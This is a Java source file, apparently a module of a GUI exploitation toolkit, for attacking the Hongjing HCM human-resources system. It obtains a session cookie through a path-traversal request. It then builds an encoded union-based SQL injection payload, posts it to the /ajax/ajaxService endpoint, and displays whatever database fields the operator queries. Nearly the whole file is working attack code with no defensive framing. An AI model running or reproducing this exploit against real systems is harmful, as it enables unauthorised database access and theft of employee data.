package exp.oa.hongjingoa;

import com.github.kevinsawicki.http.HttpRequest;
import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import decrypt.code.getAllEncode;

import java.net.URLEncoder;
import java.util.HashMap;

public class hongjing_hcm_ajaxService_sqli implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea, textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {
        return attcmd(url, cmd, textArea, textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    public static String getCookie(String url){
        try{
            String path="/templates/attestation/%2e%2e/%2e%2e/templates/index/getpassword.jsp";
            HttpRequest cookieRequest = HttpRequest.get(url + path)
                    .trustAllCerts()
                    .trustAllHosts();
            String cookie=cookieRequest.header("Set-Cookie").split(";")[0];
            return cookie;
        }catch (Exception E){
            return null;
        }
    }
    public static String HCMPayload(String sql){
        String var0 = "select "+sql+" a0100,1 a0101,1 b0110,1 e0122,1 e01a1,1 dbase,1 a0000 from operuser";
        String var1 = getAllEncode.getAllUrlEncode(var0, "char").replace("%","~");
        String var2 = getAllEncode.getU_Encode(var1);
        String var3 = URLEncoder.encode("{\"functionId\":\"151211001137\",\"sql\":\""+var2+"\",\"nbase\":\"1\"}").replace("%5C","\\");
        String var4 = var3+"l="+var3+URLEncoder.encode("se\":\"1\"}");
        return "__type=extTrans&__xml="+var4;
    }

    private Boolean att(String url, TextArea textArea, TextArea textArea_cmd) {
        String cookie = getCookie(url);
        if (cookie != null) {
            HashMap head = new HashMap();
            head.put("Cookie", cookie);
            Response post = HttpTools.post(url + "/ajax/ajaxService", HCMPayload("user"), head, "utf-8");
            if (post.getText().contains("nbase") && post.getCode() == 200) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ hongjing_hcm_ajaxService_sqli ]");
                    textArea.appendText("\n sql注入利用成功,注入方法union联合注入");
                    textArea.appendText("\n CMD处输入字段user测试");
                    textArea_cmd.appendText("\n" + post.getText());
                    textArea.appendText("\n ");
                });
                return true;
            }

        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n cookie获取失败");
                textArea.appendText("\n ");
            });
            return false;
        }
        return false;
    }

    private Boolean attcmd(String url, String sql,TextArea textArea, TextArea textArea_cmd) {
        String cookie = getCookie(url);
        if (cookie != null) {
            HashMap head = new HashMap();
            head.put("Cookie", cookie);
            Response post = HttpTools.post(url + "/ajax/ajaxService", HCMPayload(sql), head, "utf-8");
            if (post.getText().contains("nbase") && post.getCode() == 200) {
                Platform.runLater(() -> {
                    textArea.appendText("\n sql : "+sql+"注入成功");
                    textArea_cmd.appendText("\n" + post.getText());
                    textArea.appendText("\n ");
                });
                return true;
            }

        } else {
            Platform.runLater(() -> {
                textArea.appendText("\n cookie获取失败");
                textArea.appendText("\n ");
            });
            return false;
        }
        return false;
    }

}
